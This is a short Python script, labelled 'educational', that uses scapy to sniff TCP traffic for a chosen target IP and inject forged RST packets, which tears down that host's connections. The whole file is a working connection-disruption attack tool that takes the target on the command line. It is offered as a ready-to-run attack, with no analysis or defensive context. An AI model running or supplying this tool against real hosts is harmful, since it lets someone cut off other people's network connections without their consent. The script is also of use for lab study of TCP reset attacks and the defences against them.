#!/usr/bin/env python3

from scapy.all import sniff, IP, TCP, send
import argparse
import sys

def process_and_reset(packet, target_ip):
    """
        Callback function that inspects captured TCP packets,
        extracts connection parameters, and injects a TCP RST packet.
    """
    if packet.haslayer(TCP) and packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        seq = packet[TCP].seq

        if src_ip == target_ip or dst_ip == target_ip:
            if packet[TCP].flags.R:
                return
            
            print(f"[*] Captured TCP Segment: {src_ip}:{sport} --> {dst_ip}:{dport} [Seq: {seq}]")

            rst_packet = IP(src=src_ip, dst=dst_ip) / TCP(
                sport=sport,
                dport=dport,
                flags="R",
                seq=seq
            )

            send(rst_packet, verbose=False)
            print(f"[+] Injected TCP RST to reset connection between {src_ip}:{sport} and {dst_ip}:{dport}\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Educational Sniffer & TCP RST Injector")
    parser.add_argument("--target", "-t", required=True, help="Target IP address to monitor and disrupt")
    parser.add_argument("--interface", "-i", help="Network Interface to sniff on (e.g. ens33)")
    args = parser.parse_args()

    print(f"[*] Starting TCP Stream Monitor for target: {args.target}")
    print("[*] Press Ctrl+C to stop\n")

    try:
        sniff(
            filter=f"tcp and host {args.target}",    
            prn=lambda pkt: process_and_reset(pkt, args.target),
            store=False,
            iface=args.interface
        )
    except KeyboardInterrupt:
        print("\n[!] Stream distruptor stopped by user. Exiting...")
        sys.exit(0)
